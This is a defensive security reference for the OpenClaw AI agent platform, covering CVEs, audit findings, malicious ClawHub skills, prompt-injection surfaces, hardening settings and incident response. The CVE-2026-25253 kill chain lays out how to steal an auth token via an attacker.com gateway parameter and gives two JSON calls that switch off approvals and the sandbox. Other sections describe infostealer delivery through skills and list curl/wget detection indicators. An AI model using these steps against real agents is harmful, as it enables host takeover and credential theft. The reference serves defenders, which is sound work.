# OpenClaw Security Reference

Comprehensive security reference covering known vulnerabilities, attack vectors, hardening configuration, and incident response.

## CVE Details and Kill Chains

### CVE-2026-25253: 1-Click RCE via WebSocket Hijacking (CVSS 8.8)

**Type**: Cross-Site WebSocket Hijacking (CSWSH) -- CWE-669

**Root Cause**: Browsers enforce Same-Origin Policy (SOP) for HTTP but NOT for WebSocket connections. OpenClaw's WebSocket server does not validate the `origin` header.

**Kill Chain** (runs in milliseconds):

1. **Parameter Injection**: Victim visits `https://victim-openclaw?gatewayUrl=attacker.com`. The Control UI blindly accepts and persists the `gatewayUrl` parameter
2. **Immediate Connection**: `connectGateway()` fires immediately without confirmation, establishing WebSocket to attacker
3. **Token Exfiltration**: `gateway.ts` bundles `authToken` into the WebSocket handshake, sending it to attacker's server
4. **Cross-Site WebSocket Hijack**: Attacker's JS creates a WebSocket to `ws://localhost:18789` using the victim's browser as a bridge, authenticating with the stolen token
5. **Sandbox Disable**: Two API calls neutralize all protections:
   ```json
   {"method": "approvals.set", "params": {"ask": "off"}}
   {"method": "config.patch", "params": {"tools.host": "gateway"}}
   ```
6. **Full RCE**: Arbitrary command running on the host machine

**Mitigation**: Update to >= v2026.1.29. Rotate gateway auth token after updating.

**Source**: [depthfirst - 1-Click RCE Kill Chain](https://depthfirst.com/post/1-click-rce-to-steal-your-moltbot-data-and-keys)

### CVE-2026-25157: macOS SSH Command Injection (CVSS 7.8)

**Type**: SSH command injection in macOS companion app

**Mechanism**: A maliciously crafted project path can trigger arbitrary command running through the SSH subsystem

**Mitigation**: Update to >= v2026.1.29. Avoid untrusted project paths.

### CVE-2026-24763: Docker Sandbox Escape via PATH Manipulation (CVSS 8.8)

**Type**: Container escape through PATH environment variable manipulation

**Mechanism**: Manipulated PATH allows running of attacker-controlled binaries instead of intended system commands, enabling escape from Docker sandbox to host

**Mitigation**: Update to >= v2026.1.29. Use gVisor runtime for additional isolation layer.

---

## Audit Findings (512 Vulnerabilities)

The Argus Security Platform (Claude Sonnet 4.5) conducted a 6-phase analysis of 4,157 git-tracked files:

| Category | Count | Details |
|----------|-------|---------|
| AI Analysis | 28 | 8 critical, 20 high |
| SAST (Semgrep) | 190 | 113 errors, 63 warnings |
| Secrets (Gitleaks) | 255 | 245 API keys, 5 auth headers |
| Dependencies (Trivy) | 20 CVEs | 1 critical, 15 high severity |
| Verified Secrets (TruffleHog) | 8 | Unverified |
| Threat Model | 16 | 6 baseline + 10 AI-enhanced |
| **Total** | **512** | **8 classified as critical** |

### The 8 Critical Vulnerabilities

1. **Plaintext OAuth Token Storage**: Credentials in `~/.openclaw/credentials/oauth.json` without encryption (only 0o600 file permissions)
2. **CSRF Protection Gaps**: OAuth flows lack strict state parameter validation; fallback mechanisms defeat CSRF protection
3. **Hardcoded Secrets**: Base64-encoded OAuth client secrets embedded in source code
4. **Webhook Bypass Options**: `skipVerification` flag allows signature validation circumvention
5. **Token Refresh Race Conditions**: File-based locking fails silently, causing concurrent refresh requests
6. **Path Traversal Vulnerability**: Untrusted agent directory inputs could enable path traversal attacks
7. **Insufficient Permission Validation**: World-readable credential files accepted despite permission checks
8. **Expired Token Fallback**: System uses stale disk tokens when refresh fails

**Source**: [Argus Security - GitHub Issue #1796](https://github.com/openclaw/openclaw/issues/1796)

---

## Exposed Instances (135,000+)

### Discovery Data

| Source | Findings |
|--------|----------|
| **BitSight** | 30,000+ unique instances (Jan 27 - Feb 8, 2026) |
| **SecurityScorecard** | 42,900 unique IPs across 82 countries |
| **Total estimated** | 135,000+ internet-exposed |
| **Exploitable** | 12,812+ instances vulnerable to RCE |
| **Concentration** | 45% on Alibaba Cloud, 37% in China |

### Root Cause

Default configuration exposes port 18789 on all network interfaces. Many users:
- Never change `gateway.bind` from default
- Deploy nginx reverse proxy without access control
- Enable insecure authentication settings

### Honeypot Findings

Researchers detected probing on port 18789 within **minutes** of deployment. Attackers demonstrated familiarity with OpenClaw's codebase, attempting WebSocket API authentication bypasses and raw command invocation.

---

## ClawHub Malicious Skills Analysis

### Scope of Threat

| Metric | Value |
|--------|-------|
| Skills scanned | 3,984 |
| Malicious skills found | 341 (8.6%) |
| Skills with security flaws | 1,467 (36.8%) |
| Critical-level issues | 534 (13.4%) |
| Confirmed malicious payloads | 76 |
| Primary malicious publisher | `hightower6eu` (314 skills) |

### Attack Vectors

**Windows**: Skills instruct download of password-protected ZIP (`password: openclaw`) from external GitHub account containing trojan binary

**macOS**: Skills direct to Base64-obfuscated shell script that downloads and runs remote code. Primarily delivers **Atomic Stealer (AMOS)** which steals:
- System/application passwords
- Browser cookies and stored credentials
- Cryptocurrency wallets
- macOS Keychain data

### Detection Indicators

Look for these red flags in skill source code:
- `curl`, `wget`, `fetch` calls to external URLs
- Base64-encoded strings or obfuscated code
- Dynamic code evaluation or system command invocation
- Instructions to download and run binaries
- Password-protected archives
- References to obfuscation services (glot.io, pastebin, etc.)

### Known Malicious Publishers (Block List)

- `zaycv`
- `Aslaep123`
- `pepe276`
- `moonshine-100rze`
- `hightower6eu`

### Scanning Before Installation

```bash
# Scan skill with mcp-scan
npx mcp-scan <skill-path>

# VirusTotal integration (built-in since Feb 7, 2026)
# Skills on ClawHub are now automatically scanned at publication
```

**Sources**:
- [VirusTotal Blog](https://blog.virustotal.com/2026/02/from-automation-to-infection-how.html)
- [Snyk - ToxicSkills Study](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/)
- [The Hacker News](https://thehackernews.com/2026/02/researchers-find-341-malicious-clawhub.html)

---

## Prompt Injection Risks

### Attack Surfaces

| Vector | Risk | Mitigation |
|--------|------|------------|
| **Email content** | Malicious prompts in email body/metadata | Use read-only "reader" agent for untrusted email |
| **Web pages** | Injected prompts in fetched content | Disable `web_fetch`/`browser` for untrusted inputs |
| **Documents** | Prompts embedded in PDFs, images | Sandbox document processing |
| **Agent-to-agent** | Compromised agent spreads to others | Isolate agent sessions |
| **Persistent memory** | Compromised context stored permanently | Periodically audit memory DB |

### Session Isolation Vulnerability

Default `session.dmScope: "main"` means **all DMs share one session**:
- Environment variables, API keys, and files from one user become visible to others
- Files generated in Telegram are retrievable in Discord

**Fix**: Set `session.dmScope: "per-channel-peer"` for multi-user deployments.

### Model Selection for Injection Resistance

Claude Opus 4.6 provides the strongest prompt injection resistance among supported models. Use it for agents that process untrusted external content.

---

## Complete Security Configuration Reference

### Authentication

| Setting | Values | Default | Recommended |
|---------|--------|---------|-------------|
| `gateway.auth.mode` | `"token"`, `"password"` | `"token"` | `"token"` |
| `gateway.auth.token` | string | none | 64-char hex |
| `gateway.auth.allowTailscale` | boolean | `true` | `true` (with Tailscale) |
| `gateway.controlUi.dangerouslyDisableDeviceAuth` | boolean | `false` | `false` (NEVER enable) |
| `gateway.controlUi.allowInsecureAuth` | boolean | `false` | `false` (NEVER enable) |

### Network

| Setting | Values | Default | Recommended |
|---------|--------|---------|-------------|
| `gateway.bind` | `"loopback"`, `"lan"`, `"tailnet"`, `"custom"` | `"loopback"` | `"loopback"` |
| `gateway.port` | number | `18789` | `18789` |
| `gateway.trustedProxies` | string[] | `[]` | `[]` (unless using reverse proxy) |

### DM Policy

| Setting | Values | Default | Recommended |
|---------|--------|---------|-------------|
| `dmPolicy` | `"pairing"`, `"allowlist"`, `"open"`, `"disabled"` | `"pairing"` | `"pairing"` or `"allowlist"` |
| `session.dmScope` | `"main"`, `"per-channel-peer"` | `"main"` | `"per-channel-peer"` |
| `groupPolicy` | `"open"`, `"allowlist"` | `"open"` | `"allowlist"` |

### Sandboxing

| Setting | Values | Default | Recommended |
|---------|--------|---------|-------------|
| `sandbox.mode` | `"off"`, `"non-main"`, `"all"` | varies | `"all"` |
| `sandbox.scope` | `"session"`, `"agent"`, `"shared"` | `"session"` | `"session"` |
| `sandbox.workspaceAccess` | `"none"`, `"ro"`, `"rw"` | `"none"` | `"none"` |
| `sandbox.docker.network` | string | `"none"` | `"none"` |
| `sandbox.browser` | boolean | `false` | `false` |

### Logging & Redaction

| Setting | Values | Default | Recommended |
|---------|--------|---------|-------------|
| `logging.redactSensitive` | `"tools"`, `"off"` | `"tools"` | `"tools"` |
| `logging.redactPatterns` | string[] | `[]` | Add custom patterns for env-specific secrets |

### mDNS

| Setting | Values | Default | Recommended |
|---------|--------|---------|-------------|
| `discovery.mdns.mode` | `"minimal"`, `"full"`, `"off"` | `"minimal"` | `"off"` or `"minimal"` |

### File Permissions

| Path | Permission |
|------|-----------|
| `~/.openclaw/` | `700` |
| `~/.openclaw/openclaw.json` | `600` |
| `~/.openclaw/.env` | `600` |
| `~/.openclaw/credentials/*.json` | `600` |
| `~/.openclaw/agents/*/agent/auth-profiles.json` | `600` |

---

## Docker Hardening

### Recommended Docker Run Flags

```bash
docker run \
  --user 1000:1000 \
  --read-only \
  --cap-drop ALL \
  --security-opt no-new-privileges \
  --tmpfs /tmp:rw,noexec,nosuid \
  -v openclaw-data:/home/node/.openclaw \
  -p 127.0.0.1:18789:18789 \
  openclaw:latest
```

### gVisor (Recommended for High Security)

gVisor provides a virtualized kernel that intercepts syscalls, adding an additional isolation layer beyond standard Docker:

```bash
# Install gVisor
sudo apt-get install -y runsc

# Run with gVisor runtime
docker run --runtime=runsc ...
```

---

## Credential Storage Locations (Monitor/Secure)

| Path | Content |
|------|---------|
| `~/.openclaw/credentials/whatsapp/<id>/creds.json` | WhatsApp session |
| `~/.openclaw/credentials/oauth.json` | OAuth tokens |
| `~/.openclaw/credentials/<channel>-allowFrom.json` | Channel allowlists |
| `~/.openclaw/agents/<id>/agent/auth-profiles.json` | LLM API keys |
| `~/.openclaw/agents/<id>/sessions/*.jsonl` | Session transcripts |
| `/tmp/openclaw/openclaw-*.log` | Gateway logs |
| `~/.openclaw/extensions/<id>/` | Extension data |

---

## Incident Response

### Containment (Immediate)

```bash
# 1. Stop Gateway
systemctl --user stop openclaw

# 2. Lock down config
openclaw config set gateway.bind loopback
openclaw config set dmPolicy disabled
```

### Credential Rotation (Within 1 Hour)

1. Regenerate `gateway.auth.token`
2. Regenerate `gateway.remote.token`
3. Rotate ALL LLM provider API keys (Anthropic, OpenAI, etc.)
4. Rotate ALL channel tokens (Telegram, Discord, Slack, etc.)
5. Revoke and re-create Google OAuth credentials (if Gmail integrated)

### Investigation

```bash
# Review Gateway logs
cat /tmp/openclaw/openclaw-$(date +%Y-%m-%d).log

# Review session transcripts for unauthorized activity
grep -r "system.run" ~/.openclaw/agents/*/sessions/

# Check for unknown extensions
ls ~/.openclaw/extensions/
```

### Post-Incident

1. Update to latest version
2. Run `openclaw security audit --deep --fix`
3. Review all allowlists and connected accounts
4. Remove unknown sessions/contacts
5. Verify file permissions (700/600)
6. Consider full reinstall from encrypted backup

---

## Complete Uninstall & Cleanup

Standard `npm uninstall -g openclaw` leaves credentials behind. Full cleanup:

```bash
# 1. Uninstall binary
openclaw uninstall --all --yes --non-interactive

# 2. Remove ALL data directories (including legacy names)
rm -rf ~/.openclaw/
rm -rf ~/.clawdbot/
rm -rf ~/.moltbot/
rm -rf ~/.molthub/

# 3. Remove logs
rm -rf /tmp/openclaw/

# 4. CRITICAL: Rotate ALL API keys for every connected service
```

**After removal, you MUST rotate**:
- All LLM provider API keys (Anthropic, OpenAI, Google AI, etc.)
- All messaging bot tokens (Telegram, Discord, Slack, etc.)
- Google OAuth tokens (revoke in Google Cloud Console)
- Any other credentials that were stored in OpenClaw

---

## Security Resources

- [OpenClaw Security Docs](https://docs.openclaw.ai/gateway/security)
- [OpenClaw Sandboxing Docs](https://docs.openclaw.ai/gateway/sandboxing)
- [CVE-2026-25253 (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2026-25253)
- [CVE-2026-25157 (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2026-25157)
- [CVE-2026-24763 (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2026-24763)
- [SecurityScorecard STRIKE Report](https://securityscorecard.com/blog/beyond-the-hype-moltbots-real-risk-is-exposed-infrastructure-not-ai-superintelligence/)
- [BitSight - Exposed Instances](https://www.bitsight.com/blog/openclaw-ai-security-risks-exposed-instances)
- [Trend Micro - Agentic AI Risks](https://www.trendmicro.com/en_us/research/26/b/what-openclaw-reveals-about-agentic-assistants.html)
- [Adversa AI - Security 101](https://adversa.ai/blog/openclaw-security-101-vulnerabilities-hardening-2026/)
- [Auth0 - Five-Step Securing Guide](https://auth0.com/blog/five-step-guide-securing-moltbot-ai-agent/)
- [Composio - Secure Setup](https://composio.dev/blog/secure-openclaw-moltbot-clawdbot-setup)
- [CrowdStrike - What Security Teams Need to Know](https://www.crowdstrike.com/en-us/blog/what-security-teams-need-to-know-about-openclaw-ai-super-agent/)

---

**Last Updated**: 2026-02-11
